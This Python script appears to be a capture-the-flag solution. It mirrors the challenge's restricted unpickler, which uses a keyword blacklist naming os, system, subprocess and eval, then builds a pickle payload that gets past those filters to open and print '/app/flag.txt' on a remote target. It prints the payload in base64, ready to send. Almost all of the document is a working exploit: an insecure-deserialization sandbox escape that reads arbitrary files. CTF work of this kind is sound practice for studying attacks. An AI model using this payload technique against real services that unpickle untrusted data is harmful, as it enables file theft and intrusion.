import base64, io, pickle, pickletools, contextlib, os, tempfile

BANNED_PATTERNS = [b".", b"os", b"system", b"popen", b"subprocess", b"commands",
                   b"exec", b"eval", b"import", b"getattr", b"setattr", b"flag"]
BANNED_INSTRUCTION = "REDUCE"
ALLOWED_MODULES = {"sessionstore", "collections"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in ALLOWED_MODULES:
            raise pickle.UnpicklingError("module %r is not allowed" % module)
        return super().find_class(module, name)

def check(data):
    for pattern in BANNED_PATTERNS:
        if pattern in data:
            raise ValueError("banned bytes: %r" % pattern)
    out = io.StringIO()
    try:
        pickletools.dis(data, out=out)
        disassembled = out.getvalue()
        if BANNED_INSTRUCTION in disassembled:
            raise ValueError("banned instruction")
    except Exception:
        disassembled = "Error!"
    return disassembled

def restore(data):
    disassembled = check(data)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        try:
            RestrictedUnpickler(io.BytesIO(data)).load()
        except Exception:
            pass
    return buf.getvalue(), disassembled

def s_string(s: str) -> bytes:
    body = "".join("\\x%02x" % b for b in s.encode())
    return b"S'" + body.encode() + b"'\n"

def build_getitem(key: str) -> bytes:
    p  = b"ccollections\n_itemgetter\n"
    p += b"(" + s_string(key) + b"t"
    p += b"R"
    p += b"(ccollections\n__builtins__\nt"
    p += b"R"
    return p

def build_payload(path: str) -> bytes:
    p  = build_getitem("print")
    p += build_getitem("list")
    p += build_getitem("open")
    p += b"(" + s_string(path) + b"t"   # (path,)
    p += b"R"                            # open(path) -> file
    p += b"\x85"                         # (file,)
    p += b"R"                            # list(file) -> lines
    p += b"\x85"                         # (lines,)
    p += b"R"                            # print(lines)
    return p  # no STOP

def check_clean(p):
    assert b"." not in p, "contains 0x2e"
    for b in BANNED_PATTERNS:
        assert b not in p, "banned: %r" % b

# ---- local verification with a temp flag ----
tf = tempfile.NamedTemporaryFile(mode="w", suffix="_ff", delete=False)
tf.write("pwnsec{LOCAL_TEST_OK}\n"); tf.close()
local_path = tf.name.replace("\\", "/")
lp = build_payload(local_path)
# local path may contain banned bytes (windows temp) -> only sanity-run, skip clean check
out, dis = restore(lp)
print("[LOCAL] disassembled =", repr(dis[:40]))
print("[LOCAL] output       =", repr(out))
os.unlink(tf.name)

# ---- real payload for remote ----
real = build_payload("/app/flag.txt")
check_clean(real)
print("[REMOTE] clean: OK, len:", len(real))
print("[REMOTE] BASE64:")
print(base64.b64encode(real).decode())
